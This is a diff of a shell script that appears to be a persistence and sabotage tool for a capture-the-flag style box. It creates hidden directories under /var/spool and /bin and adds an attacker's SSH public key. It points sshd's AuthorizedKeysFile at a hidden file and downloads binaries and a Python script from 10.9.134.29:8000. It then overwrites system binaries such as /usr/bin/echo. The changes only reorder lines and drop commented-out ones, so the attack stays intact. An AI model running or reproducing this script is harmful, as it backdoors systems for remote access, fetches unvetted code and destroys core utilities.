@@ -9,17 +9,16 @@ cppath=$(which cp);
 mvpath=$(which mv);
 pythonpath=$(which python);
 
-
-mkdir /var/spool/.nano;
-mkdir /var/spool/.nano/.history;
-mkdir /bin/.screen;
-mkdir /bin/.screen/.config;
-
 cp $wpath ./w;
 cp $curlpath ./c;
 cp $chattrpath ./ct;
 cp $mvpath ./m;
 cp $cppath ./p;
+
+mkdir /var/spool/.nano;
+mkdir /var/spool/.nano/.history;
+mkdir /bin/.screen;
+mkdir /bin/.screen/.config;
 
 
 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkkJKTGN541AcbS8fgtHCVdaAqt5/QBXSUir4SxMFezXwY1Tprvp2Goie1WNUWG2VUw8nl6ctqHb5Oryoq4NCJUY5uScNrQ2Fysie3RiYNP15uacp0AgkulEhwH27z2VXnu/y7fJZQG+pG8pvDPt7GWSLHPD/ICWRny/r6VLKgNw03CjkCS8LmjKv7wqLOwLDZOFZWRjrIWgq0POQ5L9akynNoW/tz0D2UBDE782ObzPUNyjHIV2KLJUtpxb6AxrH+W8Pco8Sq8sorvRWk32lOmb7kBm4C8oA+/Yy0tWTibzoOWtkXzBUgqQGVZoDg+kUZV5pnzsUuX3z5zQJ4Nv3JYl7XPbWj/CL7Rwf/L1Huv35hp5xJxdivGWKui0newt67zmroebAxmHGreCocrwxoXeV/SpG3iqemsfeA7uR2ka9a3fZek/qjm7MKC2DoSEdKqC5bdQCKvmbAoVxo22VL/fLNXZPHyD6ASaGlJ1Iu5JITGUE2xI44bZHPsxJvK60= ayush@kali
@@ -28,18 +27,15 @@ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkkJKTGN541AcbS8fgtHCVdaAqt5/QBXSUir
 echo 'AuthorizedKeysFile     /bin/.screen/.config/p' >> /etc/ssh/sshd_config;
 
 
-#wget 10.9.134.29:8000/parrot  -O parrot;
 wget 10.9.134.29:8000/chattr  -O ch;
 wget 10.9.134.29:8000/nyancat  -O nyancat;
 wget 10.9.134.29:8000/ea.py -O ea.py;
 
 
 chmod +x ch;
-#chmod +x parrot;
 chmod +x nyancat;
 
 
-#cp parrot /usr/bin;
 cp nyancat /usr/bin;
 
 
@@ -57,7 +53,6 @@ cp nyancat /usr/bin/echo;
 mkdir ~/.vim
 mkdir ~/.vim/.config
 
-#cp parrot ~/.vim/.config;
 cp nyancat ~/.vim/.config;
 
 
